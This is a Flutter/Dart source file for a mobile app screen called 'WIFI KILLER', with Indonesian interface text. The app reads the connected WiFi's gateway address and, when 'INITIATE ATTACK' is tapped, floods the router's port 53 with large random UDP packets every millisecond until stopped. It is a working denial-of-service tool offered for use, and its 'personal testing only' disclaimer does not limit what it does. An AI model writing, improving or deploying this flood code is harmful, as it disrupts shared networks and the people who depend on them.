import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';

class WifiKillerPage extends StatefulWidget {
  const WifiKillerPage({super.key});

  @override
  State<WifiKillerPage> createState() => _WifiKillerPageState();
}

class _WifiKillerPageState extends State<WifiKillerPage> with TickerProviderStateMixin {
  String ssid = "-";
  String ip = "-";
  String frequency = "-";
  String routerIp = "-";
  bool isKilling = false;
  Timer? _loopTimer;

  late AnimationController _pulseController;
  late AnimationController _waveController;
  late AnimationController _scanController;
  late Animation<double> _pulseAnimation;
  late Animation<double> _waveAnimation;
  late Animation<double> _scanAnimation;

  final Color primaryDark = const Color(0xFF270A1A);
  final Color primaryPink = const Color(0xFF8A1E5A);
  final Color accentPink = const Color(0xFFF63B82);
  final Color lightPink = const Color(0xFFFA60A5);
  final Color primaryWhite = Colors.white;
  final Color accentGrey = Colors.grey.shade400;
  final Color cardDark = const Color(0xFF37152C);
  final Color glassColor = const Color(0x1FFFFFFF);

  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(
      duration: const Duration(seconds: 2),
      vsync: this,
    )..repeat(reverse: true);

    _waveController = AnimationController(
      duration: const Duration(seconds: 3),
      vsync: this,
    )..repeat();

    _scanController = AnimationController(
      duration: const Duration(milliseconds: 1500),
      vsync: this,
    );

    _pulseAnimation = Tween<double>(begin: 0.8, end: 1.2).animate(
      CurvedAnimation(parent: _pulseController, curve: Curves.easeInOut),
    );

    _waveAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _waveController, curve: Curves.linear),
    );

    _scanAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _scanController, curve: Curves.easeOut),
    );

    _loadWifiInfo();
    _scanController.forward();
  }

  @override
  void dispose() {
    _stopFlood();
    _pulseController.dispose();
    _waveController.dispose();
    _scanController.dispose();
    super.dispose();
  }

  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();

    final status = await Permission.locationWhenInUse.request();
    if (!status.isGranted) {
      _showAlert("Permission Denied", "Akses lokasi diperlukan untuk membaca info WiFi.");
      return;
    }

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gateway = await info.getWifiGatewayIP();

      setState(() {
        ssid = name ?? "-";
        ip = ipAddr ?? "-";
        routerIp = gateway ?? "-";
        frequency = "-";
      });

      print("Router IP: $routerIp");
    } catch (e) {
      setState(() {
        ssid = ip = frequency = routerIp = "Error";
      });
    }
  }

  void _startFlood() {
    HapticFeedback.heavyImpact();
    if (routerIp == "-" || routerIp == "Error") {
      _showAlert("❌ Error", "Router IP tidak tersedia.");
      return;
    }

    setState(() => isKilling = true);
    _showAlert("✅ Started", "WiFi Killer!\nStop Manually.");

    const targetPort = 53;
    final List<int> payload = List<int>.generate(65495, (_) => Random().nextInt(256));

    _loopTimer = Timer.periodic(Duration(milliseconds: 1), (_) async {
      try {
        for (int i = 0; i < 2; i++) {
          final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
          for (int j = 0; j < 9; j++) {
            socket.send(payload, InternetAddress(routerIp), targetPort);
          }
          socket.close();
        }
      } catch (_) {}
    });
  }

  void _stopFlood() {
    HapticFeedback.lightImpact();
    setState(() => isKilling = false);
    _loopTimer?.cancel();
    _loopTimer = null;
    _showAlert("🛑 Stopped", "WiFi flood attack dihentikan.");
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            color: cardDark,
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: accentPink.withOpacity(0.3)),
            boxShadow: [
              BoxShadow(
                color: accentPink.withOpacity(0.3),
                blurRadius: 15,
                spreadRadius: 2,
              ),
            ],
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Text(
                title,
                style: TextStyle(
                  color: lightPink,
                  fontSize: 20,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'Orbitron',
                ),
              ),
              const SizedBox(height: 16),
              Text(
                message,
                style: TextStyle(
                  color: primaryWhite,
                  fontSize: 16,
                ),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 20),
              GestureDetector(
                onTap: () => Navigator.pop(context),
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [primaryPink, accentPink],
                      begin: Alignment.centerLeft,
                      end: Alignment.centerRight,
                    ),
                    borderRadius: BorderRadius.circular(30),
                  ),
                  child: Text(
                    "OK",
                    style: TextStyle(
                      color: primaryWhite,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Orbitron',
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: primaryDark,
      body: Stack(
        children: [
          _buildAnimatedBackground(),

          SafeArea(
            child: Column(
              children: [
                _buildNewHeader(),

                const SizedBox(height: 20),

                Expanded(
                  child: ssid == "-"
                      ? _buildLoadingView()
                      : _buildMainContent(),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildAnimatedBackground() {
    return AnimatedBuilder(
      animation: _waveController,
      builder: (context, child) {
        return Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [
                primaryDark,
                const Color(0xFF37152C),
                const Color(0xFF2A0F17),
              ],
            ),
          ),
          child: Stack(
            children: [
              ...List.generate(20, (index) {
                final top = (_waveController.value + index * 0.05) % 1.0;
                final left = (index * 0.1) % 1.0;
                final size = 5.0 + (index % 4) * 3.0;
                final opacity = 0.1 + (index % 3) * 0.1;

                return Positioned(
                  top: top * MediaQuery.of(context).size.height,
                  left: left * MediaQuery.of(context).size.width,
                  child: Container(
                    width: size,
                    height: size,
                    decoration: BoxDecoration(
                      color: lightPink.withOpacity(opacity),
                      shape: BoxShape.circle,
                      boxShadow: [
                        BoxShadow(
                          color: lightPink.withOpacity(opacity * 0.5),
                          blurRadius: size,
                          spreadRadius: size / 2,
                        ),
                      ],
                    ),
                  ),
                );
              }),

              Positioned(
                top: -150,
                right: -150,
                child: AnimatedBuilder(
                  animation: _waveController,
                  builder: (context, child) {
                    return Transform.rotate(
                      angle: _waveController.value * 2 * 3.14159,
                      child: Container(
                        width: 400,
                        height: 400,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          gradient: RadialGradient(
                            colors: [
                              accentPink.withOpacity(0.15),
                              Colors.transparent,
                            ],
                          ),
                        ),
                      ),
                    );
                  },
                ),
              ),

              if (isKilling)
                Positioned(
                  bottom: 0,
                  left: 0,
                  right: 0,
                  child: AnimatedBuilder(
                    animation: _waveAnimation,
                    builder: (context, child) {
                      return CustomPaint(
                        size: Size(
                          MediaQuery.of(context).size.width,
                          200,
                        ),
                        painter: WavePainter(
                          _waveAnimation.value,
                          accentPink.withOpacity(0.3),
                        ),
                      );
                    },
                  ),
                ),
            ],
          ),
        );
      },
    );
  }

  Widget _buildNewHeader() {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
      decoration: BoxDecoration(
        color: glassColor,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(
          color: Colors.white.withOpacity(0.2),
          width: 1,
        ),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.2),
            blurRadius: 10,
            offset: const Offset(0, 4),
          ),
        ],
      ),
      child: Row(
        children: [
          AnimatedBuilder(
            animation: _pulseAnimation,
            builder: (context, child) {
              return Transform.scale(
                scale: isKilling ? _pulseAnimation.value : 1.0,
                child: Container(
                  width: 50,
                  height: 50,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [primaryPink, accentPink],
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                    ),
                    borderRadius: BorderRadius.circular(15),
                    boxShadow: [
                      BoxShadow(
                        color: accentPink.withOpacity(0.4),
                        blurRadius: 10,
                        offset: const Offset(0, 4),
                      ),
                    ],
                  ),
                  child: const Icon(
                    Icons.wifi_off,
                    color: Colors.white,
                    size: 30,
                  ),
                ),
              );
            },
          ),

          const SizedBox(width: 16),

          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  "WIFI KILLER",
                  style: TextStyle(
                    color: primaryWhite,
                    fontSize: 20,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'Orbitron',
                    letterSpacing: 1.5,
                  ),
                ),
                Text(
                  "Internal Network Disruption",
                  style: TextStyle(
                    color: lightPink,
                    fontSize: 14,
                    fontFamily: 'ShareTechMono',
                  ),
                ),
              ],
            ),
          ),

          Container(
            width: 12,
            height: 12,
            decoration: BoxDecoration(
              color: isKilling ? Colors.redAccent : lightPink,
              shape: BoxShape.circle,
              boxShadow: [
                BoxShadow(
                  color: (isKilling ? Colors.redAccent : lightPink).withOpacity(0.5),
                  blurRadius: 5,
                  spreadRadius: 1,
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildLoadingView() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          AnimatedBuilder(
            animation: _scanAnimation,
            builder: (context, child) {
              return Stack(
                alignment: Alignment.center,
                children: [
                  Container(
                    width: 120,
                    height: 120,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      border: Border.all(
                        color: accentPink.withOpacity(0.3),
                        width: 2,
                      ),
                    ),
                  ),

                  Container(
                    width: 100,
                    height: 100,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      border: Border.all(
                        color: accentPink.withOpacity(0.5),
                        width: 2,
                      ),
                    ),
                  ),

                  Container(
                    width: 80,
                    height: 80,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      border: Border.all(
                        color: accentPink.withOpacity(0.7),
                        width: 2,
                      ),
                    ),
                  ),

                  Transform.rotate(
                    angle: _scanAnimation.value * 2 * 3.14159,
                    child: Container(
                      width: 120,
                      height: 2,
                      decoration: BoxDecoration(
                        gradient: LinearGradient(
                          colors: [
                            Colors.transparent,
                            lightPink,
                            Colors.transparent,
                          ],
                        ),
                      ),
                    ),
                  ),

                  Icon(
                    Icons.wifi,
                    color: lightPink,
                    size: 40,
                  ),
                ],
              );
            },
          ),

          const SizedBox(height: 24),

          Text(
            "Scanning Network...",
            style: TextStyle(
              color: lightPink,
              fontSize: 18,
              fontFamily: 'Orbitron',
              fontWeight: FontWeight.bold,
            ),
          ),

          const SizedBox(height: 8),

          Text(
            "Analyzing WiFi information",
            style: TextStyle(
              color: accentGrey,
              fontSize: 14,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildMainContent() {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 20),
      child: Column(
        children: [
          Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              color: glassColor,
              borderRadius: BorderRadius.circular(20),
              border: Border.all(
                color: Colors.white.withOpacity(0.2),
                width: 1,
              ),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.2),
                  blurRadius: 10,
                  offset: const Offset(0, 4),
                ),
              ],
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Icon(Icons.network_check, color: lightPink),
                    const SizedBox(width: 8),
                    Text(
                      "NETWORK INFORMATION",
                      style: TextStyle(
                        color: primaryWhite,
                        fontSize: 16,
                        fontWeight: FontWeight.bold,
                        fontFamily: 'Orbitron',
                      ),
                    ),
                  ],
                ),

                const SizedBox(height: 16),

                _buildInfoRow("SSID", ssid, Icons.wifi),

                const SizedBox(height: 12),

                _buildInfoRow("IP Address", ip, Icons.important_devices),

                const SizedBox(height: 12),

                _buildInfoRow("Frequency", "$frequency MHz", Icons.wifi),

                const SizedBox(height: 12),

                _buildInfoRow("Router IP", routerIp, Icons.router),
              ],
            ),
          ),

          const SizedBox(height: 20),

          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: Colors.black.withOpacity(0.3),
              borderRadius: BorderRadius.circular(15),
              border: Border.all(
                color: accentPink.withOpacity(0.2),
                width: 1,
              ),
            ),
            child: Row(
              children: [
                Icon(Icons.warning_amber, color: lightPink),
                const SizedBox(width: 12),
                Expanded(
                  child: Text(
                    "Feature ini mampu mematikan jaringan WiFi yang anda sambung. Gunakan hanya untuk testing pribadi. Risiko ditanggung pengguna.",
                    style: TextStyle(
                      color: accentGrey,
                      fontSize: 14,
                    ),
                  ),
                ),
              ],
            ),
          ),

          const SizedBox(height: 30),

          GestureDetector(
            onTap: isKilling ? _stopFlood : _startFlood,
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 300),
              width: double.infinity,
              height: 60,
              decoration: BoxDecoration(
                gradient: isKilling
                    ? LinearGradient(
                  colors: [Colors.red.shade600, Colors.red.shade800],
                  begin: Alignment.centerLeft,
                  end: Alignment.centerRight,
                )
                    : LinearGradient(
                  colors: [primaryPink, accentPink],
                  begin: Alignment.centerLeft,
                  end: Alignment.centerRight,
                ),
                borderRadius: BorderRadius.circular(15),
                boxShadow: [
                  BoxShadow(
                    color: isKilling
                        ? Colors.red.withOpacity(0.4)
                        : accentPink.withOpacity(0.4),
                    blurRadius: 10,
                    offset: const Offset(0, 4),
                  ),
                ],
              ),
              child: Center(
                child: isKilling
                    ? Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    SizedBox(
                      width: 20,
                      height: 20,
                      child: CircularProgressIndicator(
                        color: primaryWhite,
                        strokeWidth: 2,
                      ),
                    ),
                    const SizedBox(width: 12),
                    Text(
                      "STOP ATTACK",
                      style: TextStyle(
                        color: primaryWhite,
                        fontWeight: FontWeight.bold,
                        fontFamily: 'Orbitron',
                        fontSize: 16,
                      ),
                    ),
                  ],
                )
                    : Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Icon(Icons.flash_on, color: primaryWhite),
                    const SizedBox(width: 12),
                    Text(
                      "INITIATE ATTACK",
                      style: TextStyle(
                        color: primaryWhite,
                        fontWeight: FontWeight.bold,
                        fontFamily: 'Orbitron',
                        fontSize: 16,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),

          const SizedBox(height: 20),

          if (isKilling)
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: Colors.red.withOpacity(0.2),
                borderRadius: BorderRadius.circular(15),
                border: Border.all(
                  color: Colors.red.withOpacity(0.5),
                  width: 1,
                ),
              ),
              child: Row(
                children: [
                  Container(
                    width: 12,
                    height: 12,
                    decoration: BoxDecoration(
                      color: Colors.redAccent,
                      shape: BoxShape.circle,
                    ),
                  ),
                  const SizedBox(width: 12),
                  Text(
                    "ATTACK IN PROGRESS",
                    style: TextStyle(
                      color: Colors.redAccent,
                      fontSize: 14,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Orbitron',
                    ),
                  ),
                ],
              ),
            ),
        ],
      ),
    );
  }

  Widget _buildInfoRow(String label, String value, IconData icon) {
    return Row(
      children: [
        Container(
          width: 40,
          height: 40,
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.3),
            borderRadius: BorderRadius.circular(10),
            border: Border.all(
              color: accentPink.withOpacity(0.3),
              width: 1,
            ),
          ),
          child: Icon(
            icon,
            color: lightPink,
            size: 20,
          ),
        ),

        const SizedBox(width: 12),

        Expanded(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                label,
                style: TextStyle(
                  color: accentGrey,
                  fontSize: 12,
                ),
              ),
              Text(
                value,
                style: TextStyle(
                  color: primaryWhite,
                  fontSize: 16,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'ShareTechMono',
                ),
              ),
            ],
          ),
        ),
      ],
    );
  }
}

class WavePainter extends CustomPainter {
  final double animationValue;
  final Color color;

  WavePainter(this.animationValue, this.color);

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = color
      ..style = PaintingStyle.fill;

    final path = Path();
    final height = size.height;
    final width = size.width;

    path.moveTo(0, height);

    for (double i = 0; i <= width; i++) {
      final x = i;
      final y = height - 30 * sin((i / width * 2 * pi) + (animationValue * 2 * pi));
      path.lineTo(x, y);
    }

    path.lineTo(width, height);
    path.close();

    canvas.drawPath(path, paint);
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => true;
}